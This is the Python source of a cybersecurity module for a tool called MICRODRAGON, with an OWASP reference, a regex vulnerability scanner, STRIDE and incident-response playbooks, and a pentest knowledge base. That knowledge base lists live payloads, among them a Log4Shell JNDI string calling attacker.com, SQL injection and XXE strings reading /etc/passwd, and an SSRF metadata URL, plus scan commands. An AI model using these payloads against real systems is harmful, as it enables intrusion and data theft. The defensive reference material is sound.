"""
microdragon/modules/security_expert/src/engine.py
═══════════════════════════════════════════════════════════════════════════════
MICRODRAGON CYBERSECURITY EXPERT MODULE
═══════════════════════════════════════════════════════════════════════════════

MICRODRAGON possesses full cybersecurity expertise:

OFFENSIVE (ethical/educational):
  - Penetration testing methodology
  - Vulnerability analysis
  - Exploit research
  - CTF solving
  - Social engineering awareness

DEFENSIVE:
  - Code auditing
  - Threat modelling
  - Incident response
  - Hardening guides
  - OSINT / recon
  - Malware analysis concepts

COMPLIANCE:
  - OWASP Top 10
  - NIST Framework
  - SOC 2 / ISO 27001
  - GDPR security requirements
  - PCI-DSS

⚠ MICRODRAGON only assists with authorised security testing and education.
   All offensive knowledge is gated behind explicit authorisation confirmations.

© 2026 EMEMZYVISUALS DIGITALS — Emmanuel Ariyo
"""

import asyncio
import subprocess
import sys
import os
import json
import re
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional


@dataclass
class VulnerabilityReport:
    severity: str           # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title: str
    file_path: str
    line_number: int
    code_snippet: str
    description: str
    cwe_id: str             # CWE-89, CWE-79, etc.
    cvss_score: float
    remediation: str
    references: list = field(default_factory=list)


@dataclass
class SecurityAuditReport:
    target: str
    scan_type: str
    timestamp: str
    critical: list = field(default_factory=list)
    high: list = field(default_factory=list)
    medium: list = field(default_factory=list)
    low: list = field(default_factory=list)
    info: list = field(default_factory=list)
    summary: str = ""
    remediation_priority: list = field(default_factory=list)


# ─── OWASP Top 10 Knowledge Base ──────────────────────────────────────────────

OWASP_TOP_10 = {
    "A01:2021": {
        "name": "Broken Access Control",
        "description": "Restrictions on what authenticated users can do are not properly enforced",
        "examples": [
            "Accessing another user's account by changing URL parameter (IDOR)",
            "Accessing admin pages without admin role",
            "Force browsing to authenticated pages as unauthenticated user",
        ],
        "detection": "Automated scanners + manual testing with multiple accounts",
        "remediation": [
            "Deny by default — only allow what's explicitly permitted",
            "Implement access control at server side, never client side",
            "Log access control failures, alert on repeated failures",
            "Invalidate JWT/session tokens on logout",
            "Use RBAC (Role-Based Access Control) consistently",
        ]
    },
    "A02:2021": {
        "name": "Cryptographic Failures",
        "description": "Weak or missing encryption of sensitive data",
        "examples": [
            "Transmitting passwords over HTTP",
            "Storing passwords as MD5 or SHA1 hashes",
            "Using ECB mode for block cipher encryption",
            "Insufficient key length (less than 128 bits)",
        ],
        "remediation": [
            "Use AES-256-GCM for symmetric encryption",
            "Use bcrypt/Argon2/scrypt for password hashing (NOT SHA/MD5)",
            "Enforce HTTPS everywhere (HSTS header)",
            "Don't store sensitive data you don't need",
            "Use up-to-date TLS (1.2 minimum, 1.3 preferred)",
        ]
    },
    "A03:2021": {
        "name": "Injection",
        "description": "User-supplied data is not validated and is sent to an interpreter",
        "types": {
            "SQL Injection": "User input inserted directly into SQL queries",
            "Command Injection": "User input passed to OS command functions",
            "LDAP Injection": "Unsanitised input in LDAP queries",
            "XSS": "User input reflected in HTML without encoding",
            "XXE": "XML external entity injection",
            "SSTI": "Server-side template injection",
        },
        "remediation": [
            "Use parameterised queries / prepared statements — ALWAYS",
            "Use allow-list input validation",
            "Escape all output in HTML context",
            "Use ORM frameworks that handle parameterisation",
            "Disable XML external entity processing",
        ]
    },
    "A04:2021": {
        "name": "Insecure Design",
        "description": "Missing or ineffective control design",
        "remediation": [
            "Threat modelling during design phase",
            "Security requirements in user stories",
            "Reference application security architecture patterns",
            "Secure design patterns — default deny, fail secure",
        ]
    },
    "A05:2021": {
        "name": "Security Misconfiguration",
        "description": "Improperly configured permissions, unnecessary features, default credentials",
        "examples": [
            "Default admin:admin credentials left unchanged",
            "S3 bucket configured as public",
            "Debug mode enabled in production",
            "Unnecessary ports/services open",
            "Missing security headers",
        ],
        "remediation": [
            "Hardening guide for every component",
            "Remove unused features, ports, services",
            "Change ALL default credentials",
            "Security headers: CSP, HSTS, X-Frame-Options",
            "Regular configuration review against CIS benchmarks",
        ]
    },
    "A06:2021": {
        "name": "Vulnerable and Outdated Components",
        "remediation": [
            "Dependency scanning (npm audit, pip audit, OWASP Dependency-Check)",
            "Subscribe to CVE databases for your stack",
            "Keep dependencies updated with automated tools (Dependabot)",
            "Only use supported versions of OS/libraries",
        ]
    },
    "A07:2021": {
        "name": "Identification and Authentication Failures",
        "examples": [
            "No brute-force protection on login",
            "Weak password policy (minimum 8 chars only)",
            "Session tokens in URLs",
            "No MFA option",
        ],
        "remediation": [
            "Implement rate limiting on authentication endpoints",
            "Enforce strong passwords + breached password check (HaveIBeenPwned API)",
            "Implement MFA",
            "Secure session management (httpOnly, secure cookie flags)",
            "Use proven auth libraries — don't roll your own",
        ]
    },
    "A08:2021": {
        "name": "Software and Data Integrity Failures",
        "examples": [
            "Deserialization of untrusted data",
            "CI/CD pipeline with no code integrity checking",
            "Auto-update without signature verification",
        ],
        "remediation": [
            "Sign all software packages and verify signatures",
            "Use a software supply chain security tool (Sigstore)",
            "Review code and configuration changes before applying",
        ]
    },
    "A09:2021": {
        "name": "Security Logging and Monitoring Failures",
        "remediation": [
            "Log all authentication events, access control failures",
            "Ensure logs have sufficient context (user, IP, timestamp, outcome)",
            "Centralise logs (ELK stack, Splunk, etc.)",
            "Alert on suspicious patterns",
            "Ensure logs cannot be deleted by attackers",
        ]
    },
    "A10:2021": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "Server makes request to attacker-controlled URL",
        "remediation": [
            "Validate and sanitise all user-supplied URLs",
            "Deny requests to internal IP ranges (10.x, 192.168.x, 169.254.x)",
            "Use allow-list of permitted destinations",
            "Disable HTTP redirections in SSRF-prone components",
        ]
    }
}


# ─── Code Security Scanner ─────────────────────────────────────────────────────

class CodeSecurityScanner:
    """
    Static analysis security scanner for common vulnerability patterns.
    Scans Python, JavaScript, TypeScript, Go, Rust, Java, PHP source files.
    """

    PATTERNS = {
        # SQL Injection
        "sql_injection": {
            "severity": "CRITICAL",
            "cwe": "CWE-89",
            "cvss": 9.8,
            "patterns": [
                r'execute\s*\(\s*["\'].*%s.*["\']',
                r'execute\s*\(\s*f["\']',
                r'query\s*=\s*["\'].*\+.*["\']',
                r'cursor\.execute\s*\(\s*".*\+',
                r'db\.query\s*\(\s*`.*\$\{',
                r'SELECT.*FROM.*WHERE.*\+.*',
            ],
            "description": "SQL injection — user input inserted directly into SQL query",
            "remediation": "Use parameterised queries: cursor.execute('SELECT * FROM users WHERE id = %s', (user_id,))"
        },

        # Command Injection
        "command_injection": {
            "severity": "CRITICAL",
            "cwe": "CWE-78",
            "cvss": 9.8,
            "patterns": [
                r'os\.system\s*\([^)]*\+',
                r'subprocess\.(run|call|Popen)\s*\([^)]*shell\s*=\s*True',
                r'eval\s*\(',
                r'exec\s*\(',
                r'`[^`]*\$\{',
                r'child_process\.exec\s*\(',
            ],
            "description": "Command injection — user input passed to shell commands",
            "remediation": "Use subprocess.run(['cmd', arg]) without shell=True, never with string concatenation"
        },

        # XSS
        "xss": {
            "severity": "HIGH",
            "cwe": "CWE-79",
            "cvss": 7.5,
            "patterns": [
                r'innerHTML\s*=\s*[^"\';\n]*req\.',
                r'document\.write\s*\(',
                r'dangerouslySetInnerHTML',
                r'render_template_string\s*\(',
                r'\|\s*safe\s*}}',  # Jinja2 | safe
            ],
            "description": "Cross-site scripting — untrusted data rendered as HTML",
            "remediation": "Always encode output: use textContent not innerHTML, escape templates"
        },

        # Hardcoded Credentials
        "hardcoded_credentials": {
            "severity": "HIGH",
            "cwe": "CWE-798",
            "cvss": 8.8,
            "patterns": [
                r'password\s*=\s*["\'][^"\']{6,}["\']',
                r'api_key\s*=\s*["\'][^"\']{10,}["\']',
                r'secret\s*=\s*["\'][^"\']{8,}["\']',
                r'token\s*=\s*["\'][^"\']{20,}["\']',
                r'AWS_SECRET_ACCESS_KEY\s*=\s*["\']',
                r'sk-[a-zA-Z0-9]{48}',  # OpenAI key
                r'ghp_[a-zA-Z0-9]{36}',  # GitHub token
            ],
            "description": "Hardcoded credentials found in source code",
            "remediation": "Use environment variables: os.getenv('API_KEY'), never hardcode secrets"
        },

        # Insecure Randomness
        "insecure_randomness": {
            "severity": "MEDIUM",
            "cwe": "CWE-330",
            "cvss": 5.3,
            "patterns": [
                r'random\.random\s*\(',
                r'Math\.random\s*\(',
                r'rand\s*\(',
            ],
            "description": "Insecure random number generation for security purposes",
            "remediation": "Use secrets.token_hex() for security contexts, not random.random()"
        },

        # Path Traversal
        "path_traversal": {
            "severity": "HIGH",
            "cwe": "CWE-22",
            "cvss": 7.5,
            "patterns": [
                r'open\s*\([^)]*request\.',
                r'open\s*\([^)]*user_input',
                r'open\s*\([^)]*params\[',
                r'readFile\s*\([^)]*req\.',
            ],
            "description": "Path traversal — user input used in file path without sanitisation",
            "remediation": "Validate and sanitise file paths: use os.path.abspath() and check it starts with allowed directory"
        },

        # Weak Cryptography
        "weak_crypto": {
            "severity": "HIGH",
            "cwe": "CWE-327",
            "cvss": 7.4,
            "patterns": [
                r'hashlib\.md5\s*\(',
                r'hashlib\.sha1\s*\(',
                r'DES\.',
                r'RC4\.',
                r'MD5\.',
                r'createHash\s*\(\s*["\']md5["\']',
                r'createHash\s*\(\s*["\']sha1["\']',
            ],
            "description": "Weak cryptographic algorithm (MD5/SHA1/DES/RC4) — collision-prone",
            "remediation": "Use SHA-256 minimum for hashing, AES-256-GCM for encryption, bcrypt/Argon2 for passwords"
        },

        # SSRF
        "ssrf": {
            "severity": "HIGH",
            "cwe": "CWE-918",
            "cvss": 8.6,
            "patterns": [
                r'requests\.get\s*\([^)]*request\.',
                r'fetch\s*\([^)]*req\.',
                r'urllib\.request\.urlopen\s*\([^)]*user',
                r'http\.get\s*\([^)]*query\.',
            ],
            "description": "Server-Side Request Forgery — user controls server-side HTTP requests",
            "remediation": "Validate URLs against allow-list, reject internal IP ranges (10.x, 192.168.x, 127.x)"
        },

        # Insecure Deserialization
        "insecure_deserialization": {
            "severity": "CRITICAL",
            "cwe": "CWE-502",
            "cvss": 9.8,
            "patterns": [
                r'pickle\.loads\s*\(',
                r'pickle\.load\s*\(',
                r'yaml\.load\s*\([^,)]*\)',  # yaml.load without Loader=yaml.SafeLoader
                r'unserialize\s*\(',
                r'ObjectInputStream\.',
            ],
            "description": "Insecure deserialization of untrusted data — can lead to RCE",
            "remediation": "Never deserialize untrusted data with pickle. Use json.loads() instead. For YAML: yaml.safe_load()"
        },
    }

    def scan_file(self, file_path: str) -> list[VulnerabilityReport]:
        """Scan a single file for security vulnerabilities."""
        try:
            content = Path(file_path).read_text(encoding="utf-8", errors="replace")
        except Exception as e:
            return []

        findings = []
        lines = content.split('\n')

        for vuln_type, vuln_info in self.PATTERNS.items():
            for pattern in vuln_info["patterns"]:
                for i, line in enumerate(lines, 1):
                    # Skip comments
                    stripped = line.strip()
                    if stripped.startswith('#') or stripped.startswith('//'):
                        continue
                    if re.search(pattern, line, re.IGNORECASE):
                        findings.append(VulnerabilityReport(
                            severity=vuln_info["severity"],
                            title=vuln_type.replace('_', ' ').title(),
                            file_path=file_path,
                            line_number=i,
                            code_snippet=line.strip()[:120],
                            description=vuln_info["description"],
                            cwe_id=vuln_info["cwe"],
                            cvss_score=vuln_info["cvss"],
                            remediation=vuln_info["remediation"],
                        ))
                        break  # one finding per pattern per file

        return findings

    def scan_directory(self, directory: str,
                        extensions: list = None) -> SecurityAuditReport:
        """Scan entire directory for security vulnerabilities."""
        import datetime
        if extensions is None:
            extensions = ['.py', '.js', '.ts', '.go', '.java', '.php', '.rs']

        report = SecurityAuditReport(
            target=directory,
            scan_type="static_analysis",
            timestamp=datetime.datetime.now().isoformat()
        )

        for ext in extensions:
            for filepath in Path(directory).rglob(f'*{ext}'):
                # Skip test files, node_modules, venv
                if any(skip in str(filepath) for skip in
                       ['node_modules', 'venv', '.venv', '__pycache__',
                        'test_', '_test.', '.test.', 'spec.']):
                    continue
                findings = self.scan_file(str(filepath))
                for f in findings:
                    if f.severity == "CRITICAL":
                        report.critical.append(f)
                    elif f.severity == "HIGH":
                        report.high.append(f)
                    elif f.severity == "MEDIUM":
                        report.medium.append(f)
                    else:
                        report.low.append(f)

        total = (len(report.critical) + len(report.high) +
                 len(report.medium) + len(report.low))

        report.summary = (
            f"Scan complete: {total} findings — "
            f"{len(report.critical)} CRITICAL, {len(report.high)} HIGH, "
            f"{len(report.medium)} MEDIUM, {len(report.low)} LOW"
        )

        # Priority remediation order
        for f in (report.critical + report.high)[:5]:
            report.remediation_priority.append({
                "priority": f.severity,
                "file": f.file_path,
                "line": f.line_number,
                "fix": f.remediation
            })

        return report

    def format_report(self, report: SecurityAuditReport) -> str:
        """Format report for terminal output."""
        lines = [
            f"",
            f"  SECURITY AUDIT REPORT",
            f"  Target: {report.target}",
            f"  {report.summary}",
            f"",
        ]

        if report.critical:
            lines.append("  🚨 CRITICAL FINDINGS:")
            for f in report.critical:
                lines.append(f"     {f.file_path}:{f.line_number}")
                lines.append(f"     {f.title} ({f.cwe_id}) CVSS:{f.cvss_score}")
                lines.append(f"     Code: {f.code_snippet}")
                lines.append(f"     Fix: {f.remediation}")
                lines.append("")

        if report.high:
            lines.append("  ⚠  HIGH FINDINGS:")
            for f in report.high:
                lines.append(f"     {f.file_path}:{f.line_number}")
                lines.append(f"     {f.title} ({f.cwe_id})")
                lines.append(f"     Fix: {f.remediation}")
                lines.append("")

        return '\n'.join(lines)


# ─── Penetration Testing Knowledge Base ────────────────────────────────────────

class PenTestKnowledge:
    """
    MICRODRAGON's penetration testing knowledge base.
    Used for AUTHORISED security assessments only.
    Each operation requires explicit scope confirmation.
    """

    METHODOLOGY = {
        "Phase 1: Reconnaissance": {
            "description": "Gather information about the target without touching their systems",
            "techniques": {
                "OSINT": [
                    "WHOIS lookup: domain registration, registrant contacts",
                    "DNS enumeration: subdomains, MX, NS records",
                    "Google Dorking: site:target.com filetype:pdf",
                    "Shodan: find exposed services, banners, certificates",
                    "LinkedIn: identify employees, tech stack from job postings",
                    "GitHub: look for leaked credentials, internal code",
                    "Wayback Machine: find historical content, old endpoints",
                    "Certificate Transparency: crt.sh for subdomains",
                ],
                "Tools": ["theHarvester", "recon-ng", "Maltego", "SpiderFoot"]
            }
        },
        "Phase 2: Scanning & Enumeration": {
            "description": "Map the attack surface with permission",
            "techniques": {
                "Port Scanning": [
                    "nmap -sV -sC -p- target.com (full scan with service detection)",
                    "nmap -sU (UDP scan for DNS, SNMP, DHCP)",
                    "masscan -p1-65535 --rate=10000 target.com (fast)",
                ],
                "Web Application": [
                    "nikto -h target.com (web server misconfigurations)",
                    "gobuster dir -u target.com -w wordlist.txt (directory brute)",
                    "ffuf -u https://target.com/FUZZ -w wordlist (fuzzing)",
                    "wappalyzer (identify tech stack)",
                    "burp suite (intercept and analyse HTTP traffic)",
                ],
                "Service Enumeration": [
                    "SMB: enum4linux -a target.com",
                    "LDAP: ldapsearch -x -H ldap://target.com",
                    "SMTP: telnet target.com 25 / VRFY / EXPN",
                ]
            }
        },
        "Phase 3: Vulnerability Analysis": {
            "description": "Identify exploitable weaknesses",
            "tools": {
                "Automated": ["Nessus", "OpenVAS", "Nuclei", "ZAP"],
                "Manual": ["Burp Suite Pro", "Manual code review", "Logic flaw analysis"]
            }
        },
        "Phase 4: Exploitation": {
            "description": "Demonstrate exploitability with minimum necessary access",
            "notes": [
                "ALWAYS stay within agreed scope",
                "Document every action with timestamps",
                "Preserve evidence (screenshots, logs)",
                "Stop at PoC — don't exfiltrate real data",
                "Notify client immediately if critical finding found",
            ]
        },
        "Phase 5: Post-Exploitation": {
            "description": "Demonstrate impact and business risk",
            "notes": [
                "Map what data/systems could be accessed",
                "Demonstrate lateral movement possibilities",
                "Document privilege escalation paths",
                "Do NOT access data beyond what demonstrates the risk",
            ]
        },
        "Phase 6: Reporting": {
            "report_sections": [
                "Executive Summary (non-technical, business impact)",
                "Scope and Methodology",
                "Findings with CVSS scores",
                "Risk ratings and business context",
                "Step-by-step reproduction",
                "Remediation recommendations (prioritised)",
                "Appendices: technical evidence",
            ]
        }
    }

    COMMON_VULNERABILITIES = {
        "Log4Shell (CVE-2021-44228)": {
            "description": "JNDI injection in Log4j — RCE without authentication",
            "payload_example": "${jndi:ldap://attacker.com/exploit}",
            "detection": "Scan logs for ${jndi: patterns",
            "fix": "Update Log4j to 2.17.1+, set -Dlog4j2.formatMsgNoLookups=true"
        },
        "SQL Injection": {
            "detection": "Try: ' OR '1'='1 / ' OR 1=1-- / ' OR SLEEP(5)--",
            "tools": ["sqlmap -u 'url?param=1' --dbs"],
            "fix": "Parameterised queries everywhere"
        },
        "IDOR (Insecure Direct Object Reference)": {
            "detection": "Change numeric IDs in API calls: /api/users/123 → /api/users/124",
            "fix": "Verify ownership on every request, use UUIDs not sequential IDs"
        },
        "JWT Algorithm Confusion": {
            "detection": "Decode JWT header: change 'alg' from RS256 to HS256, sign with public key",
            "tools": ["jwt_tool.py"],
            "fix": "Explicitly validate algorithm in JWT verification code"
        },
        "XXE (XML External Entity)": {
            "payload": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "fix": "Disable external entities in XML parser"
        },
        "SSRF": {
            "detection": "Use internal IPs: http://127.0.0.1, http://169.254.169.254/",
            "fix": "Allow-list permitted destinations"
        },
    }


# ─── Threat Modelling ─────────────────────────────────────────────────────────

class ThreatModeller:
    """STRIDE threat modelling for systems and applications."""

    STRIDE = {
        "Spoofing": {
            "description": "Attacker impersonates another identity",
            "examples": ["Email spoofing", "Session hijacking", "ARP spoofing"],
            "mitigations": ["Authentication", "MFA", "Digital signatures"]
        },
        "Tampering": {
            "description": "Attacker modifies data or code",
            "examples": ["SQL injection", "CSRF", "Code injection"],
            "mitigations": ["Integrity checks", "Input validation", "Code signing"]
        },
        "Repudiation": {
            "description": "Attacker denies performing an action",
            "examples": ["Log deletion", "Using anonymous accounts"],
            "mitigations": ["Audit logging", "Digital signatures", "Tamper-proof logs"]
        },
        "Information Disclosure": {
            "description": "Data exposed to unauthorised parties",
            "examples": ["Verbose error messages", "Open S3 buckets", "Unencrypted traffic"],
            "mitigations": ["Encryption", "Access controls", "Minimal data exposure"]
        },
        "Denial of Service": {
            "description": "Attacker disrupts legitimate access",
            "examples": ["DDoS", "Resource exhaustion", "Amplification attacks"],
            "mitigations": ["Rate limiting", "Auto-scaling", "CDN", "WAF"]
        },
        "Elevation of Privilege": {
            "description": "Attacker gains higher permissions than intended",
            "examples": ["Kernel exploits", "Sudo misconfigurations", "SSRF to metadata service"],
            "mitigations": ["Least privilege", "Patch management", "Privilege separation"]
        }
    }

    def model_threat(self, system_description: str) -> dict:
        """Build a basic threat model from system description."""
        threats = {}
        for threat_type, info in self.STRIDE.items():
            threats[threat_type] = {
                "risk": "MEDIUM",  # Would be calculated from system specifics
                "description": info["description"],
                "applicable_examples": info["examples"],
                "recommended_mitigations": info["mitigations"]
            }
        return threats


# ─── Incident Response ────────────────────────────────────────────────────────

class IncidentResponder:
    """MICRODRAGON incident response knowledge and guidance."""

    PLAYBOOKS = {
        "Data Breach": [
            "1. CONTAIN: Isolate affected systems from network immediately",
            "2. ASSESS: Identify what data was accessed/exfiltrated",
            "3. EVIDENCE: Preserve logs, memory dumps, disk images before changes",
            "4. NOTIFY: Legal/compliance team, executives within 1 hour",
            "5. NOTIFY: Regulatory bodies within 72 hours (GDPR) or as required",
            "6. NOTIFY: Affected users based on risk assessment",
            "7. ERADICATE: Remove malware, close vulnerabilities",
            "8. RECOVER: Restore from clean backups",
            "9. LESSONS: Post-incident review within 2 weeks",
        ],
        "Ransomware": [
            "1. DO NOT PAY — contact law enforcement first",
            "2. ISOLATE: Disconnect all infected machines from network",
            "3. IDENTIFY: Which variant? (check ransomware.live, ID Ransomware)",
            "4. BACKUP CHECK: Are backups clean and available?",
            "5. PRESERVE: Take forensic images of encrypted systems",
            "6. REPORT: To FBI IC3, CISA, local law enforcement",
            "7. RESTORE: From clean backups if available",
            "8. REBUILD: Affected systems from scratch if no clean backup",
            "9. INVESTIGATE: How did they get in? Patch the entry point",
        ],
        "Compromised Account": [
            "1. REVOKE: Immediately revoke all sessions for the account",
            "2. RESET: Force password reset",
            "3. MFA: Add MFA if not present, reset if present",
            "4. AUDIT: Review all actions taken by the account in last 30 days",
            "5. ROTATE: Rotate all API keys and secrets the account had access to",
            "6. INVESTIGATE: How was the account compromised? (phishing? credential stuffing?)",
            "7. HUNT: Look for lateral movement — did they touch other accounts?",
        ],
        "DDoS": [
            "1. CHARACTERISE: Volume-based, protocol, or application layer attack?",
            "2. UPSTREAM: Contact ISP/hosting provider for upstream filtering",
            "3. CDN: Activate DDoS protection (Cloudflare, AWS Shield)",
            "4. RATE LIMIT: Implement aggressive rate limiting on ingress",
            "5. IP BLOCK: Block top attacker IPs at edge",
            "6. ANYCAST: Use anycast routing to distribute attack traffic",
            "7. CAPACITY: Scale up if cloud-based and attack is manageable",
        ]
    }


# ─── Security Expert Engine ────────────────────────────────────────────────────

class SecurityExpertEngine:
    """Master security module — MICRODRAGON's cybersecurity expertise."""

    def __init__(self):
        self.scanner = CodeSecurityScanner()
        self.pentest = PenTestKnowledge()
        self.threat_modeller = ThreatModeller()
        self.incident_responder = IncidentResponder()

    async def audit_code(self, path: str) -> str:
        """Run security audit on code file or directory."""
        p = Path(path)
        if p.is_file():
            findings = self.scanner.scan_file(path)
            import datetime
            report = SecurityAuditReport(
                target=path,
                scan_type="file_scan",
                timestamp=datetime.datetime.now().isoformat()
            )
            for f in findings:
                if f.severity == "CRITICAL": report.critical.append(f)
                elif f.severity == "HIGH": report.high.append(f)
                elif f.severity == "MEDIUM": report.medium.append(f)
                else: report.low.append(f)
            total = len(findings)
            report.summary = f"{total} findings — {len(report.critical)} CRITICAL, {len(report.high)} HIGH"
        elif p.is_dir():
            report = self.scanner.scan_directory(path)
        else:
            return f"Path not found: {path}"

        return self.scanner.format_report(report)

    async def threat_model(self, system: str) -> str:
        """Produce STRIDE threat model for a system."""
        threats = self.threat_modeller.model_threat(system)
        lines = [f"\n  STRIDE THREAT MODEL: {system}\n"]
        for threat, info in threats.items():
            lines.append(f"  {threat.upper()}")
            lines.append(f"    Risk: {info['risk']}")
            lines.append(f"    {info['description']}")
            lines.append(f"    Examples: {', '.join(info['applicable_examples'][:2])}")
            lines.append(f"    Mitigate: {', '.join(info['recommended_mitigations'])}")
            lines.append("")
        return '\n'.join(lines)

    async def incident_response(self, incident_type: str) -> str:
        """Get incident response playbook."""
        for key, steps in self.incident_responder.PLAYBOOKS.items():
            if incident_type.lower() in key.lower():
                return f"\n  INCIDENT RESPONSE: {key}\n\n" + '\n'.join(f"  {s}" for s in steps)
        return f"No playbook for: {incident_type}. Available: {list(self.incident_responder.PLAYBOOKS.keys())}"

    async def owasp_guide(self, topic: str) -> str:
        """Get OWASP Top 10 guidance."""
        for vuln_id, info in OWASP_TOP_10.items():
            if topic.lower() in info["name"].lower() or topic.upper() == vuln_id:
                lines = [f"\n  {vuln_id}: {info['name']}\n",
                         f"  {info.get('description', '')}\n"]
                if "remediation" in info:
                    lines.append("  REMEDIATION:")
                    for r in info["remediation"]:
                        lines.append(f"    • {r}")
                return '\n'.join(lines)
        return f"Topic '{topic}' not found. Try: SQL injection, XSS, SSRF, cryptography"

    def get_capabilities_prompt(self) -> str:
        return """MICRODRAGON Cybersecurity Expert Capabilities:

DEFENSIVE:
  microdragon security audit <file_or_dir>       — SAST scan for vulnerabilities
  microdragon security threat-model "<system>"   — STRIDE threat modelling
  microdragon security owasp "<topic>"           — OWASP Top 10 guidance
  microdragon security incident "<type>"         — Incident response playbook
  microdragon security headers <url>             — Check HTTP security headers
  microdragon security review <pr_url>           — Security-focused PR review

KNOWLEDGE:
  microdragon security cve <cve-id>              — CVE details and remediation
  microdragon security checklist <type>          — Security checklist (webapp/api/cloud)
  microdragon security compliance <standard>     — SOC2/ISO27001/GDPR/PCI guidance

AUTHORISED TESTING ONLY:
  microdragon security recon <domain>            — OSINT reconnaissance
  microdragon security scan <target>             — Port/service scan (auth required)
  microdragon security pentest-report            — Generate pentest report template

All offensive testing requires: written authorisation + explicit scope confirmation."""


if __name__ == "__main__":
    import asyncio, sys

    async def demo():
        engine = SecurityExpertEngine()

        if len(sys.argv) > 2:
            cmd = sys.argv[1]
            target = sys.argv[2]
            if cmd == "audit":
                print(await engine.audit_code(target))
            elif cmd == "owasp":
                print(await engine.owasp_guide(target))
            elif cmd == "threat-model":
                print(await engine.threat_model(target))
            elif cmd == "incident":
                print(await engine.incident_response(target))
        else:
            print(engine.get_capabilities_prompt())

    asyncio.run(demo())
